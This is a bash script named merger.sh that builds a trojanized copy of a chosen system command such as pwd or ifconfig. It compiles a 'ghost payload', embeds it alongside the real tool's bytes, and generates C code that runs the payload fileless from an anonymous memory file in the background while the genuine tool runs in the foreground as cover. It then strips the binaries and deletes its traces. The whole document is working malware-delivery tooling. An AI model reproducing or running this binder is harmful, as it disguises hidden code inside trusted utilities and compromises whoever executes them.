#!/bin/bash

# Check if the user gave a command name (like pwd or ifconfig)
if [ -z "$1" ]; then
    echo "Usage: ./merger.sh <command>"
    echo "Example: ./merger.sh pwd"
    exit 1
fi

TARGET=$1
TARGET_PATH=$(which $TARGET)

# Check if the command actually exists on your system
if [ -z "$TARGET_PATH" ]; then
    echo "[-] Error: Command '$TARGET' not found."
    exit 1
fi

echo "[+] Building merged tool for: $TARGET_PATH"

# 1. Compile the ghost payload
gcc loader.c -o ghost -O3 -s

# 2. Copy the chosen host tool (pwd, ifconfig, etc.)
cp "$TARGET_PATH" ./host_tool

# 3. Create the byte headers
xxd -i ghost > ghost_bytes.h
xxd -i host_tool > tool_bytes.h

# 4. Generate the Final Binder Source Code
cat <<EOF > final_binder.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>

$(cat ghost_bytes.h)
$(cat tool_bytes.h)

void run(unsigned char* b, size_t s, int bg) {
    int fd = syscall(SYS_memfd_create, " ", 1);
    write(fd, b, s);
    if (fork() == 0) {
        char p[32]; sprintf(p, "/proc/self/fd/%d", fd);
        execl(p, " ", NULL);
        exit(0);
    } else if (!bg) wait(NULL);
}

int main() {
    run(ghost, ghost_len, 1);         // Ghost runs in background
    run(host_tool, host_tool_len, 0); // The chosen tool runs in foreground
    return 0;
}
EOF

# 5. Compile the final merged binary named after the target
gcc final_binder.c -o "merged_$TARGET" -s -O3

# Cleanup temporary files
rm ghost host_tool ghost_bytes.h tool_bytes.h final_binder.c

echo "[+] Success! 'merged_$TARGET' has been created."
